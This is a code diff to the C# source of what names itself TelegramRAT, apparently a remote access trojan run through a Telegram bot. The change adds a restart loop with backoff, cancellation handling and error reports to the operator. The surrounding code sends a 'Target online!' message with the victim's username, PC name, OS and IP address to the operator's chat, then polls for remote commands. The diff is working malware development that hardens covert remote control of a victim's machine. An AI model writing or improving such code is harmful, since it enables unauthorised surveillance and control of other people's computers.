@@ -8,6 +8,7 @@ using Telegram.Bot.Types;
 using Telegram.Bot;
 using System.Net;
 using System.Text.Json;
+using System.Threading;
 
 namespace TelegramRAT;
 
@@ -42,31 +43,74 @@ public static class Program
             return;
         }
 
+        using var cancellationSource = new CancellationTokenSource();
+        ConsoleCancelEventHandler? cancelHandler = null;
+        cancelHandler = (_, eventArgs) =>
+        {
+            Console.WriteLine("Cancellation requested. Shutting down gracefully...");
+            eventArgs.Cancel = true;
+            cancellationSource.Cancel();
+        };
+        Console.CancelKeyPress += cancelHandler;
+
+        var restartAttempt = 0;
+
         try
         {
-            await RunAsync();
-        }
-        catch (Exception ex)
-        {
-            if (OwnerId > 0)
+            while (!cancellationSource.IsCancellationRequested)
             {
-                await ReportExceptionAsync(new Message { Chat = new Chat { Id = OwnerId } }, ex);
+                TimeSpan? delayBeforeRestart = null;
 
-                if (ex.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request") == true)
+                using var botClient = CreateBotClient();
+                SetBotClient(botClient);
+
+                try
                 {
-                    await SendErrorAsync(new Message { Chat = new Chat { Id = OwnerId } }, new Exception("Only one bot instance can be online at the same time."));
-                    return;
+                    Console.WriteLine("Starting Telegram bot polling loop.");
+                    await RunAsync(cancellationSource.Token);
+                    break;
+                }
+                catch (OperationCanceledException) when (cancellationSource.IsCancellationRequested)
+                {
+                    Console.WriteLine("Cancellation acknowledged. Exiting.");
+                    break;
+                }
+                catch (Exception ex)
+                {
+                    restartAttempt++;
+
+                    if (!await HandleRunFailureAsync(ex, cancellationSource.Token, restartAttempt))
+                    {
+                        break;
+                    }
+
+                    delayBeforeRestart = CalculateRestartDelay(restartAttempt);
+                }
+                finally
+                {
+                    Commands.Clear();
                 }
 
-                await Bot.SendMessage(
-                    OwnerId,
-                    "Attempting to restart. Please wait...",
-                    parseMode: ParseMode.Html
-                );
-            }
+                if (delayBeforeRestart.HasValue && !cancellationSource.IsCancellationRequested)
+                {
+                    var delay = delayBeforeRestart.Value;
+                    Console.WriteLine($"Waiting {delay.TotalSeconds:F0} seconds before restart (attempt {restartAttempt}).");
 
-            Commands.Clear();
-            await Main(args);
+                    try
+                    {
+                        await Task.Delay(delay, cancellationSource.Token);
+                    }
+                    catch (OperationCanceledException)
+                    {
+                        Console.WriteLine("Cancellation requested during restart delay. Exiting.");
+                        break;
+                    }
+                }
+            }
+        }
+        finally
+        {
+            Console.CancelKeyPress -= cancelHandler;
         }
     }
 
@@ -90,7 +134,6 @@ public static class Program
 
         BotToken = botTokenValue;
         OwnerId = ownerId;
-        Bot = new TelegramBotClient(BotToken);
 
         Console.WriteLine($"TelegramRAT starting. Configuration source: {configurationSourceDescription}. Owner chat ID: {OwnerId}.");
 
@@ -157,8 +200,64 @@ public static class Program
         return (botToken, ownerId, configurationSourceDescription);
     }
 
-    private static async Task RunAsync()
+    private static TelegramBotClient CreateBotClient() => new(BotToken);
+
+    private static TimeSpan CalculateRestartDelay(int attempt)
     {
+        var seconds = Math.Min(60, Math.Pow(2, Math.Min(10, attempt)));
+        return TimeSpan.FromSeconds(seconds);
+    }
+
+    private static async Task<bool> HandleRunFailureAsync(Exception exception, CancellationToken cancellationToken, int attempt)
+    {
+        Console.Error.WriteLine($"Bot run failed on attempt {attempt}: {exception}");
+
+        var isConflict = IsConflictException(exception);
+
+        if (OwnerId > 0)
+        {
+            var ownerMessage = new Message { Chat = new Chat { Id = OwnerId } };
+
+            try
+            {
+                await ReportExceptionAsync(ownerMessage, exception);
+
+                if (isConflict)
+                {
+                    await SendErrorAsync(ownerMessage, new Exception("Only one bot instance can be online at the same time."));
+                }
+                else if (!cancellationToken.IsCancellationRequested)
+                {
+                    await Bot.SendMessage(
+                        OwnerId,
+                        $"Attempting to restart (attempt {attempt}). Please wait...",
+                        parseMode: ParseMode.Html
+                    );
+                }
+            }
+            catch (Exception notificationError)
+            {
+                Console.Error.WriteLine($"Failed to notify owner about the error: {notificationError}");
+            }
+        }
+
+        if (isConflict)
+        {
+            return false;
+        }
+
+        return !cancellationToken.IsCancellationRequested;
+    }
+
+    private static bool IsConflictException(Exception exception)
+        => exception.Message.Contains("Conflict: terminated by other getUpdates request", StringComparison.OrdinalIgnoreCase)
+           || exception.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request", StringComparison.OrdinalIgnoreCase) == true;
+
+    private static async Task RunAsync(CancellationToken cancellationToken)
+    {
+        Commands.Clear();
+        CommandRegistry.InitializeCommands(Commands);
+
         var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));
 
         var systemInfo = $"Target online!\n\nUsername: <b>{Environment.UserName}</b>\nPC name: <b>{Environment.MachineName}</b>\nOS: {Utils.GetWindowsVersion()}\n\nIP: {await Utils.GetIpAddressAsync()}";
@@ -170,18 +269,16 @@ public static class Program
             replyMarkup: markup
         );
 
-        CommandRegistry.InitializeCommands(Commands);
-
         int offset = 0;
 
-        while (true)
+        while (!cancellationToken.IsCancellationRequested)
         {
-            var updates = await Bot.GetUpdates(offset);
+            var updates = await Bot.GetUpdates(offset, cancellationToken: cancellationToken);
             if (updates.Any())
                 offset = updates.Last().Id + 1;
 
             await UpdateWorkerAsync(updates);
-            await Task.Delay(PollingDelay);
+            await Task.Delay(PollingDelay, cancellationToken);
         }
     }
 
